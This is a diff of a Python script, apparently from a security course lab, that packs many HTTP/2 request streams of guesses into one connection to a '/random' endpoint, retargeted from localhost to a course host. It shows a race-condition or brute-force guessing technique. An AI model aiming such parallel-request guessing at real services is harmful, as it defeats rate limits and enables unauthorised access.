@@ -5,8 +5,8 @@ import random
 
 # Initialize the connection with the actual hostname and port
 h2_conn = H2OnTlsConnection(
-    hostname='localhost',  # Change 'localhost' to the correct domain if hosted remotely
-    port_number=3443  # Use the server's actual port number
+    hostname='ece117.bulr.boo',  # Change 'localhost' to the correct domain if hosted remotely
+    port_number=443  # Use the server's actual port number
 )
 
 # Establish the connection
@@ -22,7 +22,7 @@ def generate_body(guess):
     return f"userGuess={guess}"
 
 # Generate a list of stream IDs for sending multiple guesses
-number_of_guesses = 1000  # Set the number of guesses you want to make
+number_of_guesses = 110 # Set the number of guesses you want to make
 stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=number_of_guesses)
 
 all_headers_frames = []  # To store all header frames
@@ -39,7 +39,7 @@ for s_id in stream_ids_list:
         headers_string=headers,
         scheme='https',
         stream_id=s_id,
-        authority="localhost",  # Same as hostname above
+        authority="ece117.bulr.boo",  # Same as hostname above
         body=body,
         path='/random'  # Ensure this matches the server's route for guesses
     )
